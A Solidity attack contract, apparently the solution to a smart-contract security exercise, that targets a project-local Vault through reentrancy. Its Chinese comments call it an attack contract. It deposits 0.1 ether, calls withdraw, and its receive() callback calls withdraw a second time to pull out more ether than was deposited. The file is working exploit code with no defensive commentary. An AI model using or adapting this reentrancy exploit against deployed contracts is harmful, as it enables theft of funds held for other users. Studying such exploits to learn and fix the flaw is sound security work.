// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/Vault.sol";

// 攻击合约
contract VaultAttack {
    Vault public vault;
    bool private reentered;
    
    constructor(Vault _vault) payable{
        vault = _vault;
    }
    

    
    // 接收ETH的回调函数，实现重入攻击
    receive() external payable {
        if (!reentered) {
            reentered = true;
            // 在接收ETH时再次调用withdraw函数
            vault.withdraw();
        }
    }

    // 攻击函数
    function attack() external payable {
        vault.deposite{value: 0.1 ether}();
        vault.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

} 